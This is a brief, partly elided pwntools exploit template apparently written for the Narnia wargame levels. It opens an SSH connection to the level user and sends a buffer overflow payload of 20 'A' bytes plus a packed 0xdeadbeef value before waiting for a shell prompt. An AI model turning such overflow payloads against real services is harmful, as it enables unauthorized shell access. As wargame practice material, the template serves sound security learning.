...
# -*- coding: utf-8 -*-
"""
# Python exploit template for pwntools.
#
#
"""
...
####################################
"""
# Usually use this scirpt for narnia levels
level = 0
user = 'narnia%s' % level
...
# Server Connection
sh = ssh(user=user, host=host, port=port,  password=password)
...
def pwn():
    ...
    r.recvuntil(':')
    r.sendline('A'*20 + p32(0xdeadbeef))
    r.recvuntil('$')
    #flag = getPass(r)
    pass
